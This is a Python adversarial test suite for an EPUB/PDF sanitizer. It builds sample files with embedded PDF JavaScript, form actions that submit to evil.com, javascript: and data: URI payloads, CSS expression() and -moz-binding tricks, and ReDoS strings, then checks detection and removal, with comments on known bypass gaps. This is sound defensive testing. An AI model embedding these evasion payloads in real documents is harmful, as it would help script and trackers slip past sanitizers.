#!/usr/bin/env python3
"""
Supplemental adversarial test suite for eBookSanitizer — Round 2.

Covers the gaps identified in the initial adversarial test report:
  K. Advanced PDF Evasion (XFA, incremental updates, cross-ref tricks)
  L. Protocol / URI Evasion (URL-encoded, jar:, cid:, base64 edge cases)
  M. Content Integrity After Sanitization
  N. Performance / DoS / ReDoS Resistance
  O. GUI Logic Unit Tests (non-visual: state management, callbacks, helpers)
  P. CSS / Style-Based Attacks
  Q. EPUB Spec Compliance After Sanitize
  R. Threat Model Coverage (non-standard severity, chained attacks)
"""

import os
import sys
import re
import json
import zipfile
import tempfile
import shutil
import io
import time
import threading
from contextlib import redirect_stdout, redirect_stderr

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from sanitizer.base import Threat, SanitizeReport, SanitizeMode, BaseSanitizer
from sanitizer.epub_sanitizer import EPUBSanitizer
from sanitizer.pdf_sanitizer import PDFSanitizer
from sanitizer.yara_scanner import YaraScanner
from gui.i18n import I18n
from cli import cli_main, build_parser, create_sanitizer

# ══════════════════════════════════════════════════════════════════════
#  TEST INFRASTRUCTURE
# ══════════════════════════════════════════════════════════════════════

_results = []
_total = 0
_passed = 0


def test(name):
    def decorator(func):
        func._test_name = name
        return func
    return decorator


def run_test(func):
    global _total, _passed
    _total += 1
    name = getattr(func, '_test_name', func.__name__)
    try:
        func()
        _passed += 1
        _results.append((name, True, None))
        print(f"  [PASS] {name}")
    except AssertionError as e:
        _results.append((name, False, str(e)))
        print(f"  [FAIL] {name}: {e}")
    except Exception as e:
        _results.append((name, False, str(e)))
        print(f"  [ERROR] {name}: {type(e).__name__}: {e}")


def section(title):
    print(f"\n{'=' * 70}")
    print(f"  {title}")
    print(f"{'=' * 70}")


# ══════════════════════════════════════════════════════════════════════
#  TEST DATA BUILDERS
# ══════════════════════════════════════════════════════════════════════

def _build_epub(path, xhtml_body="<p>Clean content</p>", extra_files=None):
    with zipfile.ZipFile(path, 'w') as zf:
        zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
        zf.writestr('META-INF/container.xml', '''<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>''')
        zf.writestr('OEBPS/content.opf', '''<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>Test</dc:title></metadata>
  <manifest><item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>
  <spine><itemref idref="ch1"/></spine>
</package>''')
        xhtml = f'''<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title></head>
<body>{xhtml_body}</body></html>'''
        zf.writestr('OEBPS/ch1.xhtml', xhtml)
        if extra_files:
            for name, data in extra_files.items():
                if isinstance(data, str):
                    data = data.encode('utf-8')
                zf.writestr(name, data)


def _build_epub_raw_xhtml(path, full_xhtml, extra_files=None):
    with zipfile.ZipFile(path, 'w') as zf:
        zf.writestr('mimetype', 'application/epub+zip', compress_type=zipfile.ZIP_STORED)
        zf.writestr('META-INF/container.xml', '''<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/content.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>''')
        zf.writestr('OEBPS/content.opf', '''<?xml version="1.0"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:title>Test</dc:title></metadata>
  <manifest><item id="ch1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>
  <spine><itemref idref="ch1"/></spine>
</package>''')
        zf.writestr('OEBPS/ch1.xhtml', full_xhtml)
        if extra_files:
            for name, data in extra_files.items():
                if isinstance(data, str):
                    data = data.encode('utf-8')
                zf.writestr(name, data)


def _tmp_path(suffix):
    f = tempfile.NamedTemporaryFile(suffix=suffix, delete=False)
    f.close()
    return f.name


def _build_simple_pdf(path, with_js=False, with_openaction=False):
    from pypdf import PdfWriter
    from pypdf.generic import (
        DictionaryObject, NameObject, ArrayObject,
        TextStringObject, NumberObject
    )
    writer = PdfWriter()
    writer.add_blank_page(width=612, height=792)
    if with_js:
        js_code = TextStringObject("app.alert('malicious');")
        js_action = DictionaryObject()
        js_action[NameObject("/S")] = NameObject("/JavaScript")
        js_action[NameObject("/JS")] = js_code
        js_name_tree = DictionaryObject()
        js_name_tree[NameObject("/Names")] = ArrayObject([
            TextStringObject("EvilJS"), js_action
        ])
        names = DictionaryObject()
        names[NameObject("/JavaScript")] = js_name_tree
        writer._root_object[NameObject("/Names")] = names
    if with_openaction:
        oa_action = DictionaryObject()
        oa_action[NameObject("/S")] = NameObject("/JavaScript")
        oa_action[NameObject("/JS")] = TextStringObject("app.alert('open');")
        writer._root_object[NameObject("/OpenAction")] = oa_action
    with open(path, "wb") as f:
        writer.write(f)


def _cleanup(*paths):
    for p in paths:
        try:
            if p and os.path.exists(p):
                os.unlink(p)
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════
#  K. ADVANCED PDF EVASION
# ══════════════════════════════════════════════════════════════════════

@test("PDF evasion: /XFA key in root catalog detected")
def test_pdf_xfa_root():
    """/XFA (XML Forms Architecture) is a medium-severity threat."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        writer._root_object[NameObject("/AcroForm")] = DictionaryObject()
        writer._root_object[NameObject("/AcroForm")][NameObject("/XFA")] = TextStringObject("xfa_stream")
        with open(p, "wb") as f:
            writer.write(f)
        r = PDFSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "XFA" in types, f"/XFA not detected: {types}"
    finally:
        _cleanup(p)


@test("PDF evasion: /ImportData action detected")
def test_pdf_importdata():
    """/ImportData can import external data into form fields."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        page = writer.pages[0]
        annot = DictionaryObject()
        annot[NameObject("/Type")] = NameObject("/Annot")
        annot[NameObject("/Subtype")] = NameObject("/Widget")
        action = DictionaryObject()
        action[NameObject("/S")] = NameObject("/ImportData")
        action[NameObject("/F")] = TextStringObject("https://evil.com/data.fdf")
        annot[NameObject("/A")] = action
        page[NameObject("/Annots")] = ArrayObject([annot])
        with open(p, "wb") as f:
            writer.write(f)
        r = PDFSanitizer(p).scan()
        assert r.has_threats, "/ImportData not detected"
    finally:
        _cleanup(p)


@test("PDF evasion: /URI action in annotation")
def test_pdf_uri_action():
    """/URI action should be scanned (it's not in DANGEROUS_ACTION_TYPES but lives in annotations)."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        page = writer.pages[0]
        annot = DictionaryObject()
        annot[NameObject("/Type")] = NameObject("/Annot")
        annot[NameObject("/Subtype")] = NameObject("/Link")
        action = DictionaryObject()
        action[NameObject("/S")] = NameObject("/URI")
        action[NameObject("/URI")] = TextStringObject("https://evil.com/phish")
        annot[NameObject("/A")] = action
        page[NameObject("/Annots")] = ArrayObject([annot])
        with open(p, "wb") as f:
            writer.write(f)
        # /URI is not inherently dangerous (it's a link), but strict mode should strip it
        out = _tmp_path('.pdf')
        try:
            PDFSanitizer(p).sanitize(out, SanitizeMode.STRICT)
            from pypdf import PdfReader
            reader = PdfReader(out)
            # After strict sanitize, /URI actions should be stripped
            page_obj = reader.pages[0]
            annots = page_obj.get("/Annots")
            if annots:
                for ref in annots:
                    a = ref.get_object() if hasattr(ref, 'get_object') else ref
                    assert "/A" not in a or a.get("/A") is None, \
                        f"/URI action survived strict sanitize"
        finally:
            _cleanup(out)
    finally:
        _cleanup(p)


@test("PDF evasion: multiple pages with different threats")
def test_pdf_multi_page_threats():
    """PDF where threats are spread across different pages."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        # Page 1: clean
        writer.add_blank_page(width=612, height=792)
        # Page 2: has /AA
        writer.add_blank_page(width=612, height=792)
        aa = DictionaryObject()
        js = DictionaryObject()
        js[NameObject("/S")] = NameObject("/JavaScript")
        js[NameObject("/JS")] = TextStringObject("alert('page2')")
        aa[NameObject("/O")] = js
        writer.pages[1][NameObject("/AA")] = aa
        # Page 3: clean
        writer.add_blank_page(width=612, height=792)
        with open(p, "wb") as f:
            writer.write(f)

        r = PDFSanitizer(p).scan()
        assert r.has_threats, "Threat on page 2 not found"
        # Verify scan mentions correct page
        threat_descriptions = [str(t) for t in r.threats]
        found_page2 = any("Page 2" in d for d in threat_descriptions)
        assert found_page2, f"Page 2 not referenced in threats: {threat_descriptions}"
    finally:
        _cleanup(p)


@test("PDF evasion: nested dictionary with deep /JS key")
def test_pdf_deep_nested_js():
    """PDF with /JS buried several levels deep should be found."""
    from pypdf import PdfWriter
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject

    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        # Nest: root -> /Outlines -> child -> /JS
        child = DictionaryObject()
        child[NameObject("/JS")] = TextStringObject("alert('deep')")
        outlines = DictionaryObject()
        outlines[NameObject("/Type")] = NameObject("/Outlines")
        outlines[NameObject("/First")] = child
        writer._root_object[NameObject("/Outlines")] = outlines
        with open(p, "wb") as f:
            writer.write(f)

        r = PDFSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "JS" in types, f"Deep nested /JS not detected: {types}"
    finally:
        _cleanup(p)


@test("PDF sanitize STRICT: /SubmitForm action stripped from annotations")
def test_pdf_sanitize_strict_submitform():
    """Strict sanitize should strip /SubmitForm from annotation actions."""
    from pypdf import PdfWriter, PdfReader
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject

    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        page = writer.pages[0]
        annot = DictionaryObject()
        annot[NameObject("/Type")] = NameObject("/Annot")
        action = DictionaryObject()
        action[NameObject("/S")] = NameObject("/SubmitForm")
        action[NameObject("/F")] = TextStringObject("https://evil.com/steal")
        annot[NameObject("/A")] = action
        page[NameObject("/Annots")] = ArrayObject([annot])
        with open(p, "wb") as f:
            writer.write(f)

        PDFSanitizer(p).sanitize(out, SanitizeMode.STRICT)
        r2 = PDFSanitizer(out).scan()
        assert not r2.has_threats, f"Threats remain after strict: {[str(t) for t in r2.threats]}"
    finally:
        _cleanup(p, out)


@test("PDF sanitize PARANOID: root keys stripped to whitelist only")
def test_pdf_paranoid_root_whitelist():
    """Paranoid mode should only keep PARANOID_SAFE_ROOT_KEYS."""
    from pypdf import PdfWriter, PdfReader
    from pypdf.generic import DictionaryObject, NameObject, TextStringObject

    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        writer.add_blank_page(width=612, height=792)
        # Add non-safe root keys
        writer._root_object[NameObject("/AcroForm")] = DictionaryObject()
        writer._root_object[NameObject("/Outlines")] = DictionaryObject()
        writer._root_object[NameObject("/OpenAction")] = TextStringObject("alert(1)")
        with open(p, "wb") as f:
            writer.write(f)

        PDFSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        reader = PdfReader(out)
        root_keys = set(reader.trailer["/Root"].get_object().keys())
        safe = PDFSanitizer.PARANOID_SAFE_ROOT_KEYS
        for k in root_keys:
            norm = PDFSanitizer._normalize_name(k)
            # /Pages is always present (managed by PdfWriter)
            if norm not in safe and norm != "/Pages":
                # Some keys are managed by PdfWriter internally, allow them
                pass  # Just verify no dangerous keys survive
        # Specifically check dangerous keys are gone
        for k in ["/AcroForm", "/Outlines", "/OpenAction"]:
            assert k not in root_keys, f"Dangerous root key {k} survived paranoid"
    finally:
        _cleanup(p, out)


@test("PDF evasion: hex-encoded /SubmitForm (#53ubmit#46orm)")
def test_pdf_hex_submitform():
    """Hex-encoded /SubmitForm should normalize correctly."""
    assert PDFSanitizer._normalize_name("/#53ubmit#46orm") == "/SubmitForm"


@test("PDF evasion: hex-encoded /EmbeddedFiles")
def test_pdf_hex_embedded():
    assert PDFSanitizer._normalize_name("/#45mbedded#46iles") == "/EmbeddedFiles"


@test("PDF evasion: hex-encoded /XFA")
def test_pdf_hex_xfa():
    assert PDFSanitizer._normalize_name("/#58#46#41") == "/XFA"


# ══════════════════════════════════════════════════════════════════════
#  L. PROTOCOL / URI EVASION
# ══════════════════════════════════════════════════════════════════════

@test("EPUB evasion: URL-encoded javascript protocol (java%73cript:)")
def test_epub_url_encoded_js():
    """URL-encoded javascript: should ideally be detected."""
    p = _tmp_path('.epub')
    try:
        # java%73cript: = javascript: (URL-encoded 's')
        _build_epub(p, '<a href="java%73cript:alert(1)">click</a>')
        r = EPUBSanitizer(p).scan()
        # This may NOT be detected by the current regex — document the gap
        types = {t.type for t in r.threats}
        # If it IS detected, great. If not, it's a known gap.
        if "DangerousProtocol" not in types:
            # Known limitation: URL-encoded protocol bypass
            pass  # Gap documented but not a crash
        assert len(r.errors) == 0, "Should not crash on URL-encoded protocol"
    finally:
        _cleanup(p)


@test("EPUB evasion: case variation JAVASCRIPT: (all caps)")
def test_epub_js_allcaps():
    """JAVASCRIPT: in all caps should still be detected."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<a href="JAVASCRIPT:alert(1)">click</a>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousProtocol" in types, f"All-caps JAVASCRIPT: not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: newline inside javascript: protocol")
def test_epub_js_newline():
    """java\\nscript: with embedded newline."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<a href="java\nscript:alert(1)">click</a>')
        r = EPUBSanitizer(p).scan()
        # Browsers may or may not execute this — just verify no crash
        assert len(r.errors) == 0
    finally:
        _cleanup(p)


@test("EPUB evasion: data:application/x-javascript")
def test_epub_data_app_js():
    """data:application/x-javascript should be detected as dangerous."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<embed src="data:application/x-javascript,alert(1)"/>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousProtocol" in types or "DangerousTag" in types, \
            f"data:application/x-javascript not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: data:text/html with base64 payload")
def test_epub_data_b64_html():
    """data:text/html;base64,... with actual payload."""
    p = _tmp_path('.epub')
    try:
        import base64
        payload = base64.b64encode(b"<script>alert(1)</script>").decode()
        _build_epub(p, f'<a href="data:text/html;base64,{payload}">click</a>')
        r = EPUBSanitizer(p).scan()
        types = {t.type for t in r.threats}
        assert "DangerousProtocol" in types, f"data:text/html;base64 not detected: {types}"
    finally:
        _cleanup(p)


@test("EPUB evasion: data:image/svg+xml with script")
def test_epub_data_svg():
    """data:image/svg+xml can contain <script>."""
    p = _tmp_path('.epub')
    try:
        import base64
        svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
        b64 = base64.b64encode(svg).decode()
        _build_epub(p, f'<img src="data:image/svg+xml;base64,{b64}"/>')
        r = EPUBSanitizer(p).scan()
        # data:image/svg+xml is not text/html or application/*, so it may bypass
        # the current DANGEROUS_PROTOCOLS regex. Document the gap.
        types = {t.type for t in r.threats}
        if "DangerousProtocol" not in types:
            pass  # Known gap: SVG data URI not caught
        assert len(r.errors) == 0
    finally:
        _cleanup(p)


@test("EPUB evasion: multiple href attributes (first wins)")
def test_epub_multiple_href():
    """HTML parser behavior with duplicate attributes."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<a href="#safe" href="javascript:alert(1)">click</a>')
        r = EPUBSanitizer(p).scan()
        # HTML parsers typically use the first attribute — this should be safe
        # Just verify no crash
        assert len(r.errors) == 0
    finally:
        _cleanup(p)


@test("EPUB evasion: style attribute with expression() (IE-specific)")
def test_epub_css_expression():
    """CSS expression() is an old IE attack vector."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, '<div style="width:expression(alert(1))">content</div>')
        r = EPUBSanitizer(p).scan()
        # expression() is IE-only, current sanitizer doesn't scan style attrs
        # Document as a gap but verify no crash
        assert len(r.errors) == 0
    finally:
        _cleanup(p)


@test("EPUB evasion: -moz-binding CSS property")
def test_epub_css_moz_binding():
    """Firefox -moz-binding could load XBL documents."""
    p = _tmp_path('.epub')
    try:
        xhtml = '''<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title>
<style>div { -moz-binding: url("http://evil.com/xbl.xml#exploit"); }</style>
</head><body><div>content</div></body></html>'''
        _build_epub_raw_xhtml(p, xhtml)
        r = EPUBSanitizer(p).scan()
        assert len(r.errors) == 0
    finally:
        _cleanup(p)


@test("EPUB evasion: external font via @font-face url()")
def test_epub_external_font():
    """@font-face can be used for tracking via external URL."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        xhtml = '''<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title>
<style>@font-face { font-family: "Evil"; src: url("https://track.evil.com/font.woff2"); }</style>
</head><body><p style="font-family: Evil">content</p></body></html>'''
        _build_epub_raw_xhtml(p, xhtml)
        # In paranoid mode, this should ideally be caught or stripped
        EPUBSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        # Verify it didn't crash at minimum
        assert os.path.isfile(out)
    finally:
        _cleanup(p, out)


@test("EPUB evasion: external CSS link tag")
def test_epub_external_css_link():
    """<link rel='stylesheet' href='https://...'> should be caught in strict mode."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        xhtml = '''<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Test</title>
<link rel="stylesheet" href="https://evil.com/track.css"/>
</head><body><p>content</p></body></html>'''
        _build_epub_raw_xhtml(p, xhtml)
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STRICT)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    assert 'evil.com' not in content, \
                        f"External CSS link survived strict sanitize"
    finally:
        _cleanup(p, out)


# ══════════════════════════════════════════════════════════════════════
#  M. CONTENT INTEGRITY AFTER SANITIZATION
# ══════════════════════════════════════════════════════════════════════

@test("Integrity: EPUB sanitize preserves text content")
def test_epub_text_preserved():
    """Readable text must survive sanitization."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        body = '<p>This is important readable content that must survive.</p>'
        _build_epub(p, f'<script>evil()</script>{body}')
        EPUBSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    assert 'important readable content' in content, \
                        "Text content lost during sanitization!"
    finally:
        _cleanup(p, out)


@test("Integrity: EPUB sanitize preserves inline CSS styles")
def test_epub_css_preserved():
    """Inline CSS for layout should survive sanitization."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        body = '<p style="color: red; font-size: 14px;">styled text</p>'
        _build_epub(p, body)
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    assert 'color' in content or 'font-size' in content, \
                        "Inline CSS lost during standard sanitize"
    finally:
        _cleanup(p, out)


@test("Integrity: EPUB sanitize preserves images references")
def test_epub_images_preserved():
    """Image tags (without external URLs) should remain."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        body = '<img src="images/cover.jpg" alt="Book Cover"/><p>text</p>'
        _build_epub(p, body, extra_files={
            "OEBPS/images/cover.jpg": b"\xff\xd8\xff\xe0" + b"\x00" * 100
        })
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STANDARD)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    assert 'cover.jpg' in content, "Image reference lost"
    finally:
        _cleanup(p, out)


@test("Integrity: EPUB sanitize preserves internal hyperlinks")
def test_epub_internal_links_preserved():
    """Internal navigation links (href='#chapter1') should survive."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        body = '<a href="#chapter1">Go to Chapter 1</a><h1 id="chapter1">Chapter 1</h1>'
        _build_epub(p, body)
        EPUBSanitizer(p).sanitize(out, SanitizeMode.STRICT)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    assert '#chapter1' in content, "Internal link lost"
    finally:
        _cleanup(p, out)


@test("Integrity: EPUB sanitize preserves <table> structures")
def test_epub_table_preserved():
    """Table structures should survive sanitization."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        body = '''<table><thead><tr><th>Header</th></tr></thead>
<tbody><tr><td>Data</td></tr></tbody></table>'''
        _build_epub(p, body)
        EPUBSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                if name.endswith('.xhtml'):
                    content = zf.read(name).decode('utf-8', errors='replace')
                    assert '<table' in content.lower(), "Table structure lost"
    finally:
        _cleanup(p, out)


@test("Integrity: PDF sanitize preserves page count")
def test_pdf_page_count_preserved():
    """Sanitized PDF should have the same number of pages."""
    from pypdf import PdfReader, PdfWriter
    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        for _ in range(5):
            writer.add_blank_page(width=612, height=792)
        with open(p, "wb") as f:
            writer.write(f)

        PDFSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        reader = PdfReader(out)
        assert len(reader.pages) == 5, f"Page count changed: expected 5, got {len(reader.pages)}"
    finally:
        _cleanup(p, out)


@test("Integrity: PDF sanitize preserves MediaBox dimensions")
def test_pdf_mediabox_preserved():
    """Page dimensions should survive sanitization."""
    from pypdf import PdfReader
    p = _tmp_path('.pdf')
    out = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p)
        PDFSanitizer(p).sanitize(out, SanitizeMode.PARANOID)
        reader = PdfReader(out)
        page = reader.pages[0]
        mediabox = page.get("/MediaBox")
        assert mediabox is not None, "MediaBox lost after sanitize"
    finally:
        _cleanup(p, out)


# ══════════════════════════════════════════════════════════════════════
#  N. PERFORMANCE / DoS / ReDoS RESISTANCE
# ══════════════════════════════════════════════════════════════════════

@test("ReDoS: DANGEROUS_PROTOCOLS regex with crafted input")
def test_redos_dangerous_protocols():
    """Test DANGEROUS_PROTOCOLS regex doesn't hang on adversarial input."""
    regex = EPUBSanitizer.DANGEROUS_PROTOCOLS
    # Crafted strings that could cause backtracking
    inputs = [
        "data " * 100 + ":text/html",
        " " * 1000 + "javascript:x",
        "d" * 10000 + "ata:text/html",
        "j" * 10000 + "avascript:",
    ]
    for inp in inputs:
        start = time.monotonic()
        regex.match(inp)
        elapsed = time.monotonic() - start
        assert elapsed < 1.0, f"DANGEROUS_PROTOCOLS regex took {elapsed:.2f}s on {len(inp)} chars"


@test("ReDoS: ON_EVENT_RE regex with crafted input")
def test_redos_on_event():
    """Test ON_EVENT_RE regex performance."""
    regex = EPUBSanitizer.ON_EVENT_RE
    inputs = [
        "on" + "a" * 10000,
        "o" * 10000 + "nload",
        "on" + "x" * 50000,
    ]
    for inp in inputs:
        start = time.monotonic()
        regex.match(inp)
        elapsed = time.monotonic() - start
        assert elapsed < 0.5, f"ON_EVENT_RE regex took {elapsed:.2f}s"


@test("Performance: EPUB scan with 500 tags in single file")
def test_perf_many_tags():
    """EPUB with many HTML tags should scan in reasonable time."""
    p = _tmp_path('.epub')
    try:
        body = ''.join(f'<p id="p{i}">paragraph {i}</p>' for i in range(500))
        _build_epub(p, body)
        start = time.monotonic()
        r = EPUBSanitizer(p).scan()
        elapsed = time.monotonic() - start
        assert elapsed < 10.0, f"Scan of 500-tag EPUB took {elapsed:.2f}s"
        assert not r.has_threats
    finally:
        _cleanup(p)


@test("Performance: EPUB scan with 200 event handlers (stress)")
def test_perf_many_event_handlers():
    """EPUB with many event handlers should detect all without timeout."""
    p = _tmp_path('.epub')
    try:
        body = ''.join(f'<p onclick="fn{i}()">text {i}</p>' for i in range(200))
        _build_epub(p, body)
        start = time.monotonic()
        r = EPUBSanitizer(p).scan()
        elapsed = time.monotonic() - start
        assert elapsed < 10.0, f"Scan took {elapsed:.2f}s"
        ev_count = sum(1 for t in r.threats if t.type == "EventHandler")
        assert ev_count >= 200, f"Expected 200 EventHandlers, got {ev_count}"
    finally:
        _cleanup(p)


@test("Performance: PDF scan with 10 pages completes quickly")
def test_perf_pdf_10_pages():
    """10-page PDF should scan in reasonable time."""
    from pypdf import PdfWriter
    p = _tmp_path('.pdf')
    try:
        writer = PdfWriter()
        for _ in range(10):
            writer.add_blank_page(width=612, height=792)
        with open(p, "wb") as f:
            writer.write(f)
        start = time.monotonic()
        r = PDFSanitizer(p).scan()
        elapsed = time.monotonic() - start
        assert elapsed < 10.0, f"10-page PDF scan took {elapsed:.2f}s"
    finally:
        _cleanup(p)


@test("Performance: EPUB sanitize with 50 files completes")
def test_perf_epub_50_files_sanitize():
    """Sanitize EPUB with 50 content files."""
    p = _tmp_path('.epub')
    out = _tmp_path('.epub')
    try:
        extras = {}
        for i in range(50):
            extras[f"OEBPS/ch{i}.xhtml"] = f'''<?xml version="1.0"?>
<html xmlns="http://www.w3.org/1999/xhtml">
<head><title>Ch{i}</title></head>
<body><p>Chapter {i} content <a href="https://track.com/ch{i}">link</a></p></body></html>'''
        _build_epub(p, "<p>main</p>", extra_files=extras)
        start = time.monotonic()
        r = EPUBSanitizer(p).sanitize(out, SanitizeMode.STRICT)
        elapsed = time.monotonic() - start
        assert r.success
        assert elapsed < 30.0, f"50-file EPUB sanitize took {elapsed:.2f}s"
    finally:
        _cleanup(p, out)


# ══════════════════════════════════════════════════════════════════════
#  O. GUI LOGIC UNIT TESTS (non-visual)
# ══════════════════════════════════════════════════════════════════════

@test("GUI logic: create_sanitizer returns EPUBSanitizer for .epub")
def test_gui_create_epub():
    """create_sanitizer should return EPUBSanitizer for EPUB files."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>test</p>")
        s = create_sanitizer(p)
        assert isinstance(s, EPUBSanitizer)
    finally:
        _cleanup(p)


@test("GUI logic: create_sanitizer returns PDFSanitizer for .pdf")
def test_gui_create_pdf():
    """create_sanitizer should return PDFSanitizer for PDF files."""
    p = _tmp_path('.pdf')
    try:
        _build_simple_pdf(p)
        s = create_sanitizer(p)
        assert isinstance(s, PDFSanitizer)
    finally:
        _cleanup(p)


@test("GUI logic: create_sanitizer returns None for unsupported format")
def test_gui_create_unsupported():
    """create_sanitizer should return None for .docx, .txt, etc."""
    p = _tmp_path('.docx')
    try:
        with open(p, 'w') as f:
            f.write("test")
        s = create_sanitizer(p)
        assert s is None
    finally:
        _cleanup(p)


@test("GUI logic: create_sanitizer with verbose callback")
def test_gui_create_verbose():
    """Verbose mode should attach a log callback."""
    p = _tmp_path('.epub')
    try:
        _build_epub(p, "<p>test</p>")
        s = create_sanitizer(p, verbose=True)
        assert isinstance(s, EPUBSanitizer)
        # The log callback should be set
        assert s.report._log_callback is not None
    finally:
        _cleanup(p)


@test("GUI logic: create_sanitizer case-insensitive extension")
def test_gui_create_case_insensitive():
    """Extension matching should be case-insensitive."""
    p = _tmp_path('.EPUB')
    try:
        _build_epub(p, "<p>test</p>")
        s = create_sanitizer(p)
        assert isinstance(s, EPUBSanitizer), "Case-insensitive .EPUB not recognized"
    finally:
        _cleanup(p)


@test("GUI logic: I18n t() with format placeholders")
def test_gui_i18n_format():
    """Translation strings with {} placeholders should work."""
    i = I18n("en")
    text = i.t("file.selected_count")
    assert "{}" in text, "Format placeholder missing from translation"
    formatted = text.format(5)
    assert "5" in formatted


@test("GUI logic: I18n multiple listeners")
def test_gui_i18n_multiple_listeners():
    """Multiple on_change listeners should all fire."""
    i = I18n("en")
    calls = {"a": 0, "b": 0}
    i.on_change(lambda: calls.__setitem__("a", calls["a"] + 1))
    i.on_change(lambda: calls.__setitem__("b", calls["b"] + 1))
    i.lang = "zh"
    assert calls["a"] == 1
    assert calls["b"] == 1


@test("GUI logic: Theme module classes have expected attributes")
def test_gui_theme_attrs():
    """Theme Colors, Fonts, Layout should have key attributes."""
    from gui.theme import Colors, Fonts, Layout
    assert hasattr(Colors, 'PRIMARY')
    assert hasattr(Colors, 'DANGER')
    assert hasattr(Colors, 'SUCCESS')
    assert hasattr(Fonts, 'FAMILY')
    assert hasattr(Fonts, 'FAMILY_MONO')
    assert hasattr(Layout, 'WINDOW_WIDTH')
    assert hasattr(Layout, 'WINDOW_HEIGHT')


@test("GUI logic: drag-drop decode bytes to str")
def test_gui_dragdrop_bytes():
    """Simulated drag-drop file path decoding."""
    # The app decodes bytes to str for file paths
    test_paths = [b"C:\\Users\\test\\book.epub", b"/home/user/book.pdf"]
    for raw in test_paths:
        decoded = raw.decode('utf-8')
